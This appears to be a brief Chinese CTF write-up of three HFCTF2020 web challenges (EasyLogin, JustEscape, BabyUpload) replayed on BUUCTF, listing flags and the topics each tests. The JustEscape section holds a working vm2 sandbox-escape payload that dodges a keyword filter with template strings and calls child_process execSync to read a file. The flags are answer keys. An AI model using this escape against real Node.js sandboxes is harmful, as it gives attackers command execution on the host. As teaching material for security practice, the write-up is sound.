# Web

BUUCTF 复现

- https://www.zhaoj.in/read-6512.html
- https://p3rh4ps.top/index.php/2020/04/19/%e8%99%8e%e7%ac%a6ctf-web-wp/

## [HFCTF2020]EasyLogin

```
```

> flag{3d4fe4a3-3649-4e92-8d1d-a93de2a08bd6}

## [HFCTF2020]JustEscape

> 知识点
  1. vm.js 沙箱逃逸与过滤绕过,
  2. JavaScript 模板字符串

1. 通过异常，发现不是PHP，而是Nodejs+vm2
2. vm2沙盒逃逸，https://github.com/patriksimek/vm2/issues/225
3. 由于被过滤，使用"``"

```js
(function (){
    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();
    try{
        Object.preventExtensions(Buffer.from(``)).a = 1;
    }catch(e){
        return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
    }
})()
```

> flag{575e4115-81bf-4dd4-ab90-f695790550d2}

## [HFCTF2020]BabyUpload

> 知识点

1. PHP代码审计
2. session处理器甄别 + session伪造
3. 函数特性(file_exists)

> 题解



> flag{740a3ee9-3128-4d61-9901-656381bdaec4}